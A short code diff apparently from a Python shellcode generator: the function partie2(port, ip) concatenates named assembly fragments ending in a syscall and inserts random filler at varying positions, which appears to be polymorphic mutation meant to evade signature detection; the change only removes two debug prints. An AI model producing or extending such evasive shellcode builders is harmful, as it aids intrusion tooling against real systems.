@@ -24,10 +24,8 @@ def partie2(port, ip):
         case 1 :
             resultat_concat = subrsp + full_random() + movb + movw1 + movw2 + movrsi + movdl + pushr8 + poprdi + moval + syscall
         case 2 : 
-            print("1")
             resultat_concat = subrsp + full_random()  + movb + movw1 + full_random() + movw2 + movrsi + movdl + pushr8 + poprdi + moval + syscall
         case 3 :
-            print("2")
             resultat_concat = subrsp + full_random() + movb + full_random()  + movw1 + movw2 + movrsi + full_random() + movdl + pushr8 + poprdi + moval + syscall
     
     return resultat_concat  
